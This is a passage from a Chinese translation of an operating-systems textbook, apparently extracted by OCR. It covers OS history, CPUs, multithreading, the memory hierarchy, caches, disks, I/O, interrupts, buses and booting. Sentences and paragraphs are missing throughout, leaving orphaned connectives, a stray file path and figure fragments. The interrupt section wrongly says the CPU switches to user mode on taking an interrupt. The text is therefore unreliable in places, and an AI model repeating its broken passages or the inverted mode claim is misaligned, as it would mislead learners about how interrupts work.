在从 1985年至1995年的十年间，Windows 只是运行在MS-DOS上层的一个图形环境。
然而，到了1995年， 一 个独立的Windows版本——具有许多操作系统功能的Windows 95发布了。
Windows 95仅仅把底层的MS- DOS 作为启动和运行老的MS-DOS 程序之用。
1998年， 一个稍做修改的系统Windows 98发布。
不过 Windows 95和Windows 98仍然使用了大量16位Intel 汇编语言。
另一个微软操作系统是Windows NT (NT 表示新技术),它在一定的范围内同Windows 95兼容，但 是内部是完全新编写的。
它是一个32位系统。
Windows NT的首席设计师是David Cutler,他也是VAX VMS 操作系统的设计师之一，所以有些VMS 的概念用在了NT 上。
事实上，NT 中有太多来自VMS 的思 想，所以VMS的所有者DEC公司控告了微软公司。
法院对该案件判决的结果引出了一大笔需要用多位数 字表达的金钱。
微软公司期待NT的第一个版本可以消灭MS-DOS 和其他的Windows版本，因为NT 是 一 个巨大的超级系统，但是这个想法失败了。
只有Windows NT 4.0踏上了成功之路，特别在企业网络方面 取得了成功。
1999年年初，Windows NT 5.0改名为Windows 2000。
微软期望它成为Windows 98和 Windows NT 4.0的接替者。
2007年1月，微软公司发布了Windows XP的后继版，名为Vista。
它有一个新的图形接口、改进的安 全性以及许多新的或升级的用户程序。
微软公司希望Vista能够完全替代XP, 但事与愿违。
相反，由于 对系统要求高、授权条件严格以及对数字版权管理 (Digital Rights Management,一种使用户更难复制 被保护资料的技术)的支持， Vista 受到了大量批评，负面报道不断。
随着全新的且并不那么消耗资源的操作系统Windows 7的到来，很多人决定跳过Vista 。
Windows 7 并没有引进很多特性，但它相对较小且十分稳定。
不到三周时间，Windows 7就抢占了比Vista 七周获得 的还多的市场份额。
2012年，微软发布了它的后继者，即针对触摸屏、拥有全新外观和体验的Windows 8。
微软希望这个全新设计会成为台式机、便携式电脑、笔记本电脑、平板电脑、手机、家庭影院电脑等各 种设备上的主流操作系统。
然而，到目前为止，其市场渗透相比Windows 7而言要慢很多。
顺便说明一下，在本书中我们使用x86 这个术语代表所有使用指令集体系结构家族的现代处理器， 这类处理器的源头可以追溯到20世纪70年代的8086芯片。
很多像AMD 和Intel 这样的公司制造的处理器 底层实现大相径庭：32位或64位、核或多或少、流水线或深或浅，等等。
然而对程序员而言，它们看起 来都是相似的，并且都能运行35年前写的8086代码。
在需要强调不同处理器的差异时，我们会提到明确 的模型，并且使用x86-32 和x86-64分别表示32位和64位的变种。
FreeBSD 是一个源自Berkeley 的BSD项目，也是一个流行的UNIX变体。
所有现代Macintosh 计算机 都运行着FreeBSD 的某个修改版。
在使用高性能RISC芯片的工作站上，UNIX 系统也是一种标准配置。
它的衍生系统在移动设备上被广泛使用，例如那些运行iOS 7和Android的设备。
尽管许多UNIX 用户，特别是富有经验的程序员更偏好基于命令的界面而不是GUI, 但是几乎所有 的UNIX系统都支持由MIT开发的称为X Window的视窗系统(如众所周知的X11)。
这个系统具有基本的 视窗管理功能，允许用户通过鼠标创建、删除、移动和变比视窗。
对于那些希望有图形系统的UNIX用 户，通常在X11之上还提供一个完整的GUI, 如 Gnome 或KDE, 从而使得UNIX在外观和感觉上类似于 Macintosh 或Microsoft Windows。
另一个开始于20世纪80年代中期的有趣发展是，那些运行网络操作系统和分布式操作系统 (Tanenbaum 和Van Steen,2007)的个人计算机网络的增长。
在网络操作系统中，用户知道多台计算机 的存在，能够登录到一台远程机器上并将文件从一台机器复制到另一台机器，每台计算机都运行自己本 地的操作系统，并有自己的本地用户(或多个用户)。
相反，分布式操作系统是以一种传统单处理器操作系统的形式出现在用户面前的，尽管它实际上是 由多处理器组成的。
用户应该不知晓自己的程序在何处运行或者自己的文件存放于何处，这些应该由操 作系统自动和有效地处理。
真正的分布式操作系统不仅仅是在单机操作系统上增添一小段代码，因为分布式系统与集中式系统 有本质的区别。
例如，分布式系统通常允许一个应用在多台处理器上同时运行，因此，需要更复杂的处 理器调度算法来获得最大的并行度优化。
网络中的通信延迟往往导致分布式算法必须能适应信息不完备、信息过时甚至信息不正确的环境。
这与单机系统完全不同，对于后者，操作系统掌握着整个系统的完备信息。
1.2.5 第五代(1990年至今):移动计算机
自从20世纪40年代连环漫画中的Dick Tracy警探对着他的“双向无线电通信腕表”说话开始，人们 就在渴望一款无论去哪里都可以随身携带的交流设备。
第一台真正的移动电话出现在1946年并且重达80 斤。
你可以带它去任何地方，前提是你得有一辆拉着它的汽车。
第一台真正的手持电话出现在20世纪70年代，大约2斤重，绝对属于轻量级。
它被人们爱称为“砖 头”。
很快，每个人都想要一块这样的“砖头”。
现在，移动电话已经渗入全球90%人口的生活中。
我们 不仅可以通过便携电话和腕表打电话，在不久的将来还可以通过眼镜和其他可穿戴设备打电话。
而且， 手机这种东西已不再那么引人注目，我们在车水马龙间从容地收发邮件、上网冲浪、给朋友发信息、玩 游戏，一切都是那么习以为常。
虽然在电话设备上将通话和计算合二为一的想法在20世纪70年代就已经出现了，但第一台真正的智 能手机直到20世纪90年代中期才出现。
这部手机就是诺基亚发布的N9000, 它真正做到了将通常处于独 立工作状态的两种设备合二为一：手机和个人数字助理 (Personal Digital Assistant,PDA) 。
1997年， 爱立信公司为它的GS88 “Penelope”手机创造出术语智能手机 (smartphone)。
毕竟，在智能手机出现后的第一个十年中，大多数手机自首款产品出厂以来都运行着Symbian OS。
Symbian 操作系统被许多主流品牌选中，包括三星、索尼爱立信和摩托罗拉，特别是诺基亚也选择了它。
然而，其他操作系统已经开始侵吞Symbian 的市场份额，例如RIM 公司的Blackberry oS(2002年引入智 能手机)和苹果公司的iOS(2007 年随第一代iPhone 发布)。
很多公司都预期RIM能继续主导商业市场， 而iOS 会成为消费者设备中的王者。
然而，Symbian 的市场份额骤跌。
2011年，诺基亚放弃Symbian 并且 宣布将Windows Phone作为自己的主流平台。
在一段时间内，苹果公司和RIM公司是市场的宠儿(虽然 不像曾经的Symbian 那样占有绝对地位),但谷歌公司2008年发布的基于Linux的操作系统Android, 没有 花费太长时间就追上了它的竞争对手。
对于手机厂商而言，Android 有着开源的优势，获得许可授权后便可使用。
于是，厂商可以修改它 并轻松地适配自己的硬件设备。
并且，Android 拥有大量软件开发者，他们大多通晓Java编程语言。
即使 如此，最近几年也显示出Android 的优势可能不会持久，并且其竞争对手极其渴望从它那里夺回一些市 场份额。
我们将在10.8节进一步介绍Android。
1.3 计算机硬件简介
操作系统与运行该操作系统的计算机硬件联系密切。
操作系统扩展了计算机指令集并管理计算机 的资源。
为了能够工作，操作系统必须了解大量的硬件，至少需要了解硬件如何面对程序员。
出于这 个原因，这里我们先简要地介绍现代个人计算机中的计算机硬件，然后开始讨论操作系统的具体工作 细节。
总线
图1-6 简单个人计算机中的一些部件
12 第 1 章
1.3.1 处理器
计算机的“大脑”是CPU, 它从内存中取出指令并执行之。
在每个CPU 基本周期中，首先从内存中 取出指令，解码以确定其类型和操作数，接着执行之，然后取指、解码并执行下一条指令。
按照这一方 式，程序被执行完成。
除了用来保存变量和临时结果的通用寄存器之外，多数计算机还有一些对程序员可见的专用寄存器。
其中之一是程序计数 器 ，它保存了将要取出的下一条指令的内存地址。
在指令取出之后，程序计数器就 被更新以便指向后继的指令。
另一个寄存器是堆 栈 指 针 ，它指向内存中当前栈的顶端。
该栈包含了每个执行过程的栈帧。
一个过 程的栈帧中保存了有关的输入参数、局部变量以及那些没有保存在寄存器中的临时变量。
当然还有程序状态字 (Program Status Word,PSW) 寄存器。
这个寄存器包含了条件码位(由比较 指令设置)、CPU 优先级、模式(用户态或内核态),以及各种其他控制位。
用户程序通常读入整个PSW, 但是，只对其中的少量字段写入。
在系统调用和I/O中 ，PSW的作用很重要。
操作系统必须知晓所有的寄存器。
在时间多路复用 (time multiplexing)CPU中，操作系统经常会 中止正在运行的某个程序并启动(或再启动)另一个程序。
每次停止一个运行着的程序时，操作系统必 须保存所有的寄存器值，这样在稍后该程序被再次运行时，可以把这些寄存器重新装入。
为了改善性能，CPU 设计师早就放弃了同时读取、解码和执行一条指令的简单模型。
许多现代CPU 具 有同时取出多条指令的机制。
例如， 一个CPU 可以有单独的取指单元、解码单元和执行单元，于是当它执 行指令n时，还可以对指令n+1 解码，并且读取指令n+2 。
这样的机制称为流水线 (pipeline), 图1-7a 是一个有着三个阶段的流水线示意图。
更长的流水线也是常见的。
在多数的流水线设计中， 一旦一条指令 被取进流水线中，它就必须被执行完毕，即便前一条取出的指令是条件转移，它也必须被执行完毕。
流水 线使得编译器和操作系统的编写者很头疼，因为它造成了在机器中实现这些软件的复杂性问题，而机器必 须处理这些问题。
图1-7 a)有三个阶段的流水线； b)一个超标量CPU
相反，用户程序在用户态下运行，仅允许执行整个指令集的一个子集和访问所有功能的一个子集。
一般而言，在用户态中有关I/O 和内存保护的所有指令是禁止的。
当然，将PSW中的模式位设置成内核 态也是禁止的。
有必要指出的是，计算机使用陷阱而不是一条指令来执行系统调用。
其他的多数陷阱是由硬件引起 的，用于警告有异常情况发生，如试图被零除或浮点下溢等。
在所有的情况下，操作系统都得到控制权 并决定如何处理异常情况。
有时，由于出错的原因，程序不得不停止。
在其他情况下可以忽略出错(如 下溢数可以被置为零)。
最后，若程序已经提前宣布它希望处理某类条件，那么控制权还必须返回给该 程序，让其处理相关的问题。
多线程和多核芯片
Moore 定律指出，芯片中晶体管的数量每18个月翻一番。
这个“定律”并不是物理学上的某种规律， 诸如动量守恒定律等，它是 Intel 公司的共同创始人Gordon Moore对半导体公司快速缩小晶体管能力上 的一个观察结果。
Moore 定律已经保持了30年，有希望至少再保持10年。
在那以后，每个晶体管中原子 的数目会变得太少，并且量子力学将扮演重要角色，这将阻止晶体管尺寸的进一步缩小。
显然，下一步不仅是有多个功能部件，某些控制逻辑也会出现多个。
Intel Pentium 4引入了被称为 多线程 (multithreading) 或超线程 (hyperthreading, 这 是Intel 公司的命名)的特性，x86 处理器和其他 一些CPU 芯片就是这样做的，包括SPARC 、Power5 、Intel Xeon和Intel Core系列。
近似地说，多线程允 许CPU保持两个不同的线程状态，然后在纳秒级的时间尺度内来回切换。
(线程是一种轻量级进程，即 一个运行中的程序。
我们将在第2章中具体讨论。
)例如，如果某个进程需要从内存中读出一个字(需要 花费多个时钟周期),多线程CPU则可以切换至另一个线程。
多线程不提供真正的并行处理。
在一个时 刻只有一个进程在运行，但是线程的切换时间则减少到纳秒数量级。
多线程对操作系统而言是有意义的，因为每个 线程在操作系统看来就像是单个的CPU 。
考虑一个 实际有两个CPU的系统，每个CPU 有两个线程。
这 样操作系统将把它看成是4个CPU。
如果在某个特定 时间点上，只有能够维持两个CPU 忙碌的工作量， 那么在同一个CPU 上调度两个线程，而让另一个 CPU 完全空转，就没有优势了。
这种选择远远不如 在每个CPU上运行一个线程的效率高。
除了多线程，还出现了包含2个或4个完整处理 器或内核的CPU芯片。
图1-8中的多核芯片上有效地 装有4个小芯片，每个小芯片都是一个独立的CPU (后面将解释缓存)。
Intel Xeon Phi和Tilera TilePro等
L1
缓存
a) b)
图1-8 a) 带有共享L2 缓存的4核芯片；
b) 带有分离L2缓存的4核芯片
处理器，已经炫技般地在一枚芯片上集成了60多个核。
要使用这类多核芯片肯定需要多处理器操作系统。
1.3.2 存储器
在任何一种计算机中，第二种主要部件都是存储器。
在理想情形下，存储器应该极为迅速(快于执
行一条指令，这样CPU不会受到存储器的 限制),充分大，并且非常便宜。
但是目 前的技术无法同时满足这三个目标，于是 出现了不同的处理方式。
存储器系统采用 一种分层次的结构，如图1-9所示。
顶层的 存储器速度较高，容量较小，与底层的存 储器相比每位成本较高，其差别往往是十 亿数量级。
典型的访问时间 典型的容量
<1 KB 4MB 1～8GB 1～4TB
图1-9 典型的存储层次结构，图中的数据是非常粗略的估计
存储器系统的顶层是CPU 中的寄存器。
它们用与CPU 相同的材料制成，所以和CPU 一样快。
显然， 访问它们是没有时延的。
其典型的存储容量是，在32位CPU中为32×32位，而在64位CPU中为64×64 位。
在这两种情形下，其存储容量都小于1 KB。
程序必须在软件中自行管理这些寄存器(即决定如何使 用它们)。
下一层是高速缓存，它多数由硬件控制。
主存被分割成高速缓存行 (cache line),其典型大小为64 字节，地址0至63对应高速缓存行0,地址64至127对应高速缓存行1,以此类推。
最常用的高速缓存行放 置在CPU内部或者非常接近CPU的高速缓存中。
当某个程序需要读一个存储字时，高速缓存硬件检查所 需要的高速缓存行是否在高速缓存中。
如果是，称为高速缓存命中，缓存满足了请求，就不需要通过总 线把访问请求送往主存。
高速缓存命中通常需要两个时钟周期。
高速缓存未命中就必须访问内存，这要 付出大量的时间代价。
由于高速缓存的价格昂贵，所以其大小有限。
有些机器具有两级甚至三级高速缓 存，每一级高速缓存比前一级慢且容量更大。
/home/ast/projects/minix3/src/kernel/clock.c
的长路径名转换成文件所在的磁盘地址的结果，也可以放入缓存，以避免重复寻找地址。
还有，当一个 Web 页 面 (URL) 的地址转换为网络地址(IP 地址)后，这个转换结果也可以缓存起来供将来使用。
还 有许多其他的类似应用。
在任何缓存系统中，都有若干需要尽快考虑的问题， 包括：
1)何时把一个新的内容放入缓存。
2)把新内容放在缓存的哪一行上。
3)在需要时，应该把哪个内容从缓存中移走。
4)应该把新移走的内容放在某个较大存储器的何处。
并不是每个问题的解决方案都符合每种缓存处理。
对于CPU缓存中的主存缓存行，每当有缓存未命中时， 就会调入新的内容。
通常通过所引用内存地址的高位计算应该使用的缓存行。
例如，对于64字节的4096个 缓存行以及32位地址，其中6～17位用来定位缓存行，而0～5位则用来确定缓存行中的字节。
在这个例子 中，被移走内容的位置就是新数据要进入的位置，但是在有的系统中未必是这样。
最后，当将一个缓存行 的内容重写进主存时(该内容被缓存后，可能会被修改),通过该地址来唯一确定需重写的主存位置。
缓存是一种好方法，所以现代CPU 中设计了两个缓存。
第一级或称为L1 缓存总是在CPU 中，通常
用来将已解码的指令调入CPU的执行引擎。
对于那些频繁使用的数据字，多数芯片安排有第二个L1缓存。
典型的L1缓存大小为16KB 。
另外，往往还设计有二级缓存，称为L2缓存，用来存放近来使用过的若干 兆字节的内存字。
L1 和L2 缓存之间的差别在于时序。
对L1缓存的访问，不存在任何延时；而对L2 缓存 的访问，则会延时1或2个时钟周期。
在多核芯片中，设计师必须确定缓存的位置。
在图1-8a中，一个L2缓存被所有的核共享。
Intel 多核 芯片采用了这个方法。
相反，在图1-8b中，每个核有自己的L2缓 存 。
AMD 采用这个方法。
不过每种策 略都有自己的优缺点。
例如，Intel 的共享L2缓存需要有一种更复杂的缓存控制器，而AMD的方式在设 法保持L2缓存一致性上存在困难。
在图1-9的层次结构中，再往下一层是主存。
这是存储器系统的主力。
主存通常称为随机访问存储 器 (Random Access Memory,RAM)。
过去有时称之为磁芯存储器，因为在20世纪50年代和60年代，使 用很小的可磁化的铁磁体制作主存。
虽然它们已经绝迹了很多年，但名称还是传承了下来。
目前，存储 器的容量在几百兆字节到若干吉字节之间，并且其容量正在迅速增长。
所有不能在高速缓存中得到满足 的访问请求都会转往主存。
EEPROM (Electrically Erasable PROM,电可擦除可编程ROM) 和闪存 (flash memory) 也是非 易失性的，但是与ROM相反，它们可以擦除和重写。
不过重写它们需要比写入RAM更高数量级的时间， 所以它们的使用方式与ROM 相同，而其与众不同的特点使它们有可能通过字段重写的方式纠正所保存 程序中的错误。
在便携式电子设备中，闪存通常作为存储媒介。
闪存是数码相机中的胶卷，是便携式音乐播放器的 磁盘，这仅仅是闪存用途中的两项。
闪存在速度上介于RAM 和磁盘之间。
另外，与磁盘存储器不同， 如果闪存擦除的次数过多，就被磨损了。
还有一类存储器是CMOS, 它是易失性的。
许多计算机利用CMOS 存储器保持当前时间和日期。
CMOS 存储器和递增时间的时钟电路由一块小电池驱动，所以，即使计算机没有上电，时间也仍然可以 正确地更新。
CMOS 存储器还可以保存配置参数，如哪一个是启动磁盘等。
之所以采用CMOS 是因为它 消耗的电能非常少，一块工厂原装的电池往往能使用若干年。
但是，当电池开始失效时，计算机就会出 现 “Alzheimer 病症”——计算机会忘掉记忆多年的事物，比如应该由哪个磁盘启动等。
1.3.3 磁 盘
下一个层次是磁盘(硬盘)。
磁盘同RAM 相比， 每个二进制位的成本低了两个数量级，而且经常也 有两个数量级大的容量。
磁盘唯一的问题是随机访 问数据时间大约慢了三个数量级。
其低速的原因是 因为磁盘是一种机械装置，如图1-10所示。
在一个磁盘中有一个或多个金属盘片，它们以 5400rpm 、7200rpm 、10800rpm或更高的速度旋转。
从 边缘开始有一个机械臂悬横在盘面上，这类似于老式 播放塑料唱片33转唱机上的拾音臂。
信息写在磁盘的 一系列同心圆上。
在任意一个给定臂的位置，每个磁 头可以读取一段环形区域，称为磁道 (track) 。
把一个 给定臂的位置上的所有磁道合并起来，组成了一个柱 面 (cylinder)。
图1-10 磁盘驱动器的构造
日 一种病因未明的原发退行性大脑疾病，以记忆受损为主要特征，是老年性痴呆中最常见的一种类型。
——译者注
有时，你会听到人们在谈论一些实际上根本不是磁盘的磁盘，比如固态硬盘 (Solid State Disk, SSD)。
固态硬盘并没有可以移动的部分，外形也不像唱片那样，并且数据是存储在存储器(闪存)中 的。
与磁盘唯一的相似之处就是它也存储了大量即使在电源关闭时也不会丢失的数据。
许多计算机支持一种著名的虚拟内存机制，这将在第3章中讨论。
这种机制使得期望运行大于物理 内存的程序成为可能，其方法是将程序放在磁盘上，而将主存作为一种缓存，用来保存最频繁使用的部 分程序。
这种机制需要快速地映像内存地址，以便把程序生成的地址转换为有关字节在RAM中的物理
地址。
这种映像由CPU中的一个称为存储器管理单元 (Memory Management Unit,MMU) 的部件来完
成，如图1-6所示。
缓存和MMU的出现对系统的性能有着重要的影响。
在多道程序系统中，从一个程序切换到另一个 程序，有时称为上下文切换 (context switch),有必要对来自缓存的所有修改过的块进行写回磁盘操作， 并修改MMU中的映像寄存器。
但是这两种操作的代价很昂贵，所以程序员努力避免使用这些操作。
我 们稍后将看到这些操作产生的影响。
1.3.4 IV/O设 备
CPU和存储器不是操作系统唯一需要管理的资源。
I/O 设备也与操作系统有密切的相互影响。
如图1-6 所示，I/O 设备一般包括两个部分：设备控制器和设备本身。
控制器是插在电路板上的一块芯片或一组芯 片，这块电路板物理地控制设备。
它从操作系统接收命令，例如，从设备读数据，并且完成数据的处理。
在许多情形下，对这些设备的控制是非常复杂和具体的，所以，控制器的任务是为操作系统提供一 个简单的接口(不过还是很复杂)。
例如，磁盘控制器可以接受一个命令从磁盘2读出11206号扇区，然 后，控制器把这个线性扇区号转化为柱面、扇区和磁头。
由于外柱面比内柱面有较多的扇区，而且一些 坏扇区已经被映射到磁盘的其他地方，所以这种转换将是很复杂的。
磁盘控制器必须确定磁头臂应该在 哪个柱面上，并对磁头臂发出指令以使其前后移动到所要求的柱面号上，接着必须等待对应的扇区转动 到磁头下面并开始读出数据，随着数据从驱动器读出，要消去引导块并计算校验和。
最后，还得把输入 的二进制位组成字并存放到存储器中。
为了完成这些工作，在控制器中经常安装一个小的嵌入式计算机， 该嵌入式计算机运行为执行这些工作而专门编好的程序。
I/O 设备的另一个部分是实际设备的自身。
设备本身有个相对简单的接口，这是因为接口既不能做 很多工作，又已经被标准化了。
例如，标准化后任何一个SATA磁盘控制器就可以适配任一种SATA磁盘， 所以标准化是必要的 。
ATA 代表高级技术附件 (AT Attachment),而 SATA 表示串行高级技术附件 (Serial ATA)。
想必你们在好奇AT代表着什么,它是IBM公司的第二代个人计算机高级技术 (Advanced Technology), 采用该公司于1984年推出的6MHz 80286处理器，这一处理器是当年最为强大的。
从中我 们可以看出，计算机工业有着不断用新的前缀或后缀来扩展首字母缩写词的习惯。
我们还能看出，像 “高级”这样的形容词应当谨慎使用，否则30年后再回首时会显得非常愚昧。
现在SATA是很多计算机的标准硬盘接口。
由于实际的设备接口隐藏在控制器中，所以，操作系统 看到的是对控制器的接口，这个接口可能和设备接口有很大的差别。
每类设备控制器都是不同的，所以，需要不同的软件进行控制。
专门与控制器对话，发出命令并接收 响应的软件，称为设备驱动程序 (device driver)。
每个控制器厂家必须为所支持的操作系统提供相应的设备 驱动程序。
例如，一台扫描仪会配有用于OSX 、Windows 7 、Windows 8以及Linux的设备驱动程序。
为了能够使用设备驱动程序，必须把设备驱动程序装入操作系统中，这样它可在核心态运行。
设备 驱动程序可以在内核外运行，现代的Linux和Windows 操作系统也的确对这种方式提供一些支持。
绝大 多数驱动程序仍然需要在内核态运行。
只有很少一部分现代系统(如MINIX 3) 在用户态运行全部驱动 程序。
在用户态运行的驱动程序必须能够以某种受控的方式访问设备，然而这并不容易。
要将设备驱动程序装入操作系统，有三个途径。
第一个途径是将内核与设备驱动程序重新链接，然 后重启动系统。
许多UNIX 系统以这种方式工作。
第二个途径是在一个操作系统文件中设置一个入口， 并通知该文件需要一个设备驱动程序，然后重启动系统。
在系统启动时，操作系统去找寻所需的设备驱 动程序并装载之。
Windows 就是以这种方式工作。
第三种途径是，操作系统能够在运行时接受新的设备 驱动程序并且立即将其安装好，无须重启动系统。
这种方式采用得较少，但是正在变得普及起来。
热插 拔设备，诸如USB和IEEE 1394设备(后面会讨论)都需要动态可装载设备驱动程序。
每个设备控制器都有少量用于通信的寄存器。
例如，一个最小的磁盘控制器也会有用于指定磁盘地 址、内存地址、扇区计数和方向(读或写)的寄存器。
要激活控制器，设备驱动程序从操作系统获得一 条命令，然后翻译成对应的值，并写进设备寄存器中。
所有设备寄存器的集合构成了I/O 端口空间，我 们将在第5章讨论有关内容。
在有些计算机中，设备寄存器被映射到操作系统的地址空间(操作系统可使用的地址),这样，它 们就可以像普通存储字一样读出和写入。
在这种计算机中，不需要专门的I/O指令，用户程序可以被硬 件阻挡在外，防止其接触这些存储器地址(例如，采用基址和界限寄存器)。
在另外一些计算机中，设 备寄存器被放入一个专门的I/O端口空间中，每个寄存器都有一个端口地址。
在这些机器中，提供在内 核态中可使用的专门IN和OUT 指令，供设备驱动程序读写这些寄存器用。
前一种方式不需要专门的I/O 指令，但是占用了一些地址空间。
后者不占用地址空间，但是需要专门的指令。
这两种方式的应用都很 广泛。
实现输入和输出的方式有三种。
在最简单的方式中，用户程序发出一个系统调用，内核将其翻译成 一个对应设备驱动程序的过程调用。
然后设备驱动程序启动I/O并在一个连续不断的循环中检查该设备， 看该设备是否完成了工作(一般有一些二进制位用来指示设备仍在忙碌中)。
当I/O结束后，设备驱动程 序把数据送到指定的地方(若有此需要),并返回。
然后操作系统将控制返回给调用者。
这种方式称为 忙等待 (busy waiting),其缺点是要占据CPU,CPU 一直轮询设备直到对应的I/O操作完成。
第二种方式是设备驱动程序启动设备并且让该设备在操作完成时发出一个中断。
设备驱动程序在这 个时刻返回。
操作系统接着在需要时阻塞调用者并安排其他工作进行。
当设备驱动程序检测到该设备的 操作完毕时，它发出一个中断通知操作完成。
在操作系统中，中断是非常重要的，所以需要更具体地讨论。
在图1-11a中，有一个I/O的三步过程。
在第1步，设备驱动程序通过写设备寄存器通知设备控制器做什么。
然后，设备控制器启动该设备。
当 设备控制器传送完毕被告知要进行读写的字节数量后，它在第2步中使用特定的总线发信号给中断控制 器芯片。
如果中断控制器已经准备接收中断(如果正忙于一个更高级的中断，也可能不接收),它会在 CPU 芯片的一个管脚上声明，这就是第3步。
在第4步中，中断控制器把该设备的编号放到总线上，这样 CPU可以读总线，并且知道哪个设备刚刚完成了操作(可能同时有许多设备在运行)。
3 CPU
1
磁盘 驱动器
a) b)
图1-11 a) 启动 一个I/O设备并发出中断的过程；b) 中断处理过程包括取中断、运行中断处理程序和返回用户程序
18 第 1 章
一 旦CPU 决定取中断，通常程序计数器和PSW 就被压入当前堆栈中，并且 CPU 被切换到用户态。
设备编号可以成为部分内存的一个引用，用于寻找该设备中断处理程序的地址。
这部分内存称为中断向 量 (interrupt vector)。
当中断处理程序(中断设备的设备驱动程序的一部分)开始后，它取走已入栈的 程序计数器和PSW, 并保存之，然后查询设备的状态。
在中断处理程序全部完成之后，它返回到先前运 行的用户程序中尚未执行的头一条指令。
这些步骤如图1-11b所示。
第三种方式是，为I/O 使用一种特殊的直接存储器访问(Direct Memory Access,DMA) 芯片，它 可以控制在内存和某些控制器之间的位流，而无须持续的CPU干预。
CPU 对DMA芯片进行设置，说明 需要传送的字节数、有关的设备和内存地址以及操作方向，接着启动DMA。
当 DMA芯片完成时，它引 发一个中断，其处理方式如前所述。
有关DMA和I/O硬件会在第5章中具体讨论。
1.3.5 总线
图1-6中的结构在小型计算机中使用了多年，并用在早期的IBM PC中。
但是，随着处理器和存储器 速度越来越快，到了某个转折点时，单总线(当然还有IBM PC总线)就很难处理总线的交通流量了， 只有放弃。
其结果是导致其他的总线出现，它们处理I/O 设备以及CPU 到存储器的速度都更快。
这种演 化的结果是，目前一台大型x86 系统的结构如图1-12所示。
图1-12 一个大型x86系统的结构
图中的系统有很多总线(例如高速缓存、内存、PCIe、PCI、USB、SATA 和DMI), 每条总线的传 输速度和功能都不同。
操作系统必须了解所有总线的配置和管理。
其中主要的总线是PCle(Peripheral
Component Interconnect Express)总线。
Intel 发明的PCIe 总线是陈旧的PCI 总线的继承者，而PCI 总线则是为了取代原来的ISA(Industry
Standard Architecture)总线。
数十Gb/s的传输能力使得PCIe比它的前身快得多。
它们在本质上也十分不 同。
直到发明PCle 总线的2004年，大多数总线都是并行且共享的。
共享总线架构(shared bus architecture) 表示多个设备使用一些相同的导线传输数据。
因此，当多个设备同时需要发送数据时，需 要仲裁器决定哪个设备可以使用总线。
PCIe 恰好相反，它使用分离的端到端的链路。
传统PCI 使用的并 行总线架构 (parallel bus architecture) 表示通过多条导线发送数据的每一个字。
例如，在传统的PCI总 线上， 一个32位数据通过32条并行的导线发送。
与之相反，PCIe 使 用串行总线架构(serial bus
architecture), 通过一条被称为数据通路的链路传递集合了所有位的一条消息，这非常像网络包。
这样 做简单了很多，因为不用再确保所有32位在同一时刻精确地到达目的地。
通过将多个数据通路并行起来， 并行性仍可有效利用。
例如，可以使用32个数据通路并行传输32条消息。
随着网卡和图形适配器这些外 围设备速度的迅速增长，PCIe 标准每3~5年进行一次更新。
例如，PCIe 2.0规格的16个数据通路提供 64Gb/s的速度，升级到PCle 3.0后会提速2倍，而PCle 4.0会再提速2倍。
同时，还有很多符合老的PCI标准的旧设备。
正如我们在图1-12中看到的那样，这些设备连接到独 立的集成处理器。
未来，当我们觉得用“陈旧”已经不能形容PCI, 而只能称其为“古老”时，很可能 所有的PCI设备将连接到另一个集成中心，这些中心再连接到主集成中心，从而形成总线树。
在图中，CPU 通过DDR3总线与内存对话，通过PCIe 总线与外围图形设备对话，通过DMI(Direct
Media Interface)总线经集成中心与所有其他设备对话。
而集成中心通过通用串行总线与USB设备对话， 通过SATA总线与硬盘和DVD驱动器对话，通过PCIe传输以太网络帧。
我们已经提到过使用传统PCI总线 的旧的PCI设备。
不仅如此，每一个核不仅有独立的高速缓存，而且还共享一个大得多的高速缓存。
每一种高速缓存 都引入了又一条总线。
USB(Universal Serial Bus) 是用来将所有慢速I/O 设备(如键盘和鼠标)与计算机连接的。
然而， 以5Gb/s 运行的现代USB 3.0设备被认为很慢，这对于伴随第一代IBM个人计算机(以8Mb/s ISA作为主要 总线)共同长大的人来说似乎并不自然。
USB 采用一种小型的4~11针(取决于版本)连接器，其中一些 针为USB设备提供电源或者接地。
USB 是一种集中式总线，其根设备每1ms 轮询一次I/O设备，看是否有 信息收发。
USB 1.0可以处理总计12Mb/s的负载，USB 2.0总线提速到480Mb/s, 而USB 3.0能达到不小 于5Gb/s 的速率。
所有USB设备都可以连接到计算机然后立即工作，而不像之前的设备那样要求重启， 这让一批沮丧的用户感到非常惊讶。
要在如图1-12展示的环境下工作，操作系统必须了解有些什么外部设备连接到计算机上，并对它们 进行配置。
这种需求导致Intel和微软设计了一种名为即插即用 (plug and play)的 I/O 系统，这是基于一 种首先被苹果Macintosh 实现的类似概念。
在即插即用之前，每块I/O 卡有一个固定的中断请求级别和用 于其I/O 寄存器的固定地址，例如，键盘的中断级别是1,并使用0x60至0x64的I/O地址，软盘控制器是 中断6级并使用0x3FO至0x3F7的I/O地址，而打印机是中断7级并使用0x378 至0x37A的I/O 地址等。
到目前为止，一切正常。
比如，用户买了一块声卡和调制解调卡，并且它们都是可以使用中断4的， 但此时，问题发生了，两块卡互相冲突，结果不能在一起工作。
解决方案是在每块I/O 卡上提供DIP 开关 或跳接器，并指导用户对其进行设置以选择中断级别和I/O地址，使其不会与用户系统的任何其他部件 冲突。
那些热衷于复杂PC硬件的十几岁的青少年有时可以不出差错地做这类工作。
但是，没有人能够不 出 错 。
即插即用所做的工作是，系统自动地收集有关I/O 设备的信息，集中赋予中断级别和I/O 地址，然后 通知每块卡所使用的数值。
这项工作与计算机的启动密切相关，所以下面我们开始讨论计算机的启动。
不过这不是件轻松的工作。
1.3.6 启动计算机
简要启动过程如下。
在每台计算机上有一块双亲板(在政治因素影响到计算机产业之前，它们曾称 为“母板”)。
在双亲板上有一个称为基本输入输出系统 (Basic Input Output System,BIOS)的 程 序 。
在BIOS内有底层I/O 软件，包括读键盘、写屏幕、进行磁盘I/O以及其他过程。
现在这个程序存放在一块 闪速RAM中，它是非易失性的，但是在发现BIOS中有错时可以通过操作系统对它进行更新。
在计算机启动时，BIOS 开始运行。
它首先检查所安装的RAM数量，键盘和其他基本设备是否已安 装并正常响应。
接着，它开始扫描PCIe 和PCI总线并找出连在上面的所有设备。
即插即用设备也被记录 下来。
如果现有的设备和系统上一次启动时的设备不同，则新的设备将被配置。
然 后 ，BIOS 通过尝试存储在CMOS 存储器中的设备清单决定启动设备。
用户可以在系统刚启动之
后进入一个BIOS 配置程序，对设备清单进行修改。
典型地，如果存在CD-ROM (有时是USB), 则系统 试图从中启动；如果失败，系统将从硬盘启动。
启动设备上的第一个扇区被读入内存并执行。
这个扇区 中包含一个对保存在启动扇区末尾的分区表检查的程序，以确定哪个分区是活动的。
然后，从该分区读 入第二个启动装载模块。
